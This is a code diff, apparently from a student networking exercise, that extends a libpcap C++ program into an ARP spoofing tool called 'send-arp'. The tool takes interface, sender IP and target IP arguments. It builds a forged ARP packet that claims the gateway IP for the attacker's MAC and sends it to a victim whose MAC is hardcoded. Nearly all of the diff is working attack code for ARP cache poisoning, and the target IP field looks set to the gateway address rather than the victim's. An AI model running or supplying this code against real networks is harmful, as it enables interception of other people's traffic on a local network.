@@ -16,31 +16,34 @@ struct EthArpPacket final {
 #pragma pack(pop)
 
 void usage() {
-	printf("syntax: send-arp-test <interface>\n");
-	printf("sample: send-arp-test wlan0\n");
+	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
+	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
 }
 
 int main(int argc, char* argv[]) {
-	if (argc != 2) {
+	if (argc != 4) {
 		usage();
 		return -1;
 	}
 
-	char* dev = argv[1];
+	char* interf = argv[1]; //interface
+	char* vicIp = argv[2]; //sender ip
+	char* gateIp = argv[3]; //target ip
+
 	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
+	pcap_t* handle = pcap_open_live(interf, 0, 0, 0, errbuf);
 	if (handle == nullptr) {
-		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
+		fprintf(stderr, "couldn't open device %s(%s)\n", interf, errbuf);
 		return -1;
 	}
 
 	EthArpPacket packet;
-	string interface = dev;
+	string interface = interf;
 
 	//get my(attacker)'s mac address
 	string myMac = get_mac(interface); 
 
-	string vicMac;
+	string vicMac = "5a:c9:0b:85:08:12";
 
 	packet.eth_.smac_ = Mac(myMac);
 	packet.eth_.dmac_ = Mac(vicMac);
@@ -55,11 +58,11 @@ int main(int argc, char* argv[]) {
 	//My mac
 	packet.arp_.smac_ = Mac(myMac);
 	//target ip(gateway)
-	packet.arp_.sip_ = htonl(Ip("0.0.0.0"));
+	packet.arp_.sip_ = htonl(Ip(gateIp));
 	
 	//Victim
-	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
-	packet.arp_.tip_ = htonl(Ip("0.0.0.0")); 
+	packet.arp_.tmac_ = Mac(vicMac);
+	packet.arp_.tip_ = htonl(Ip(gateIp)); 
 
 	/*
 	result
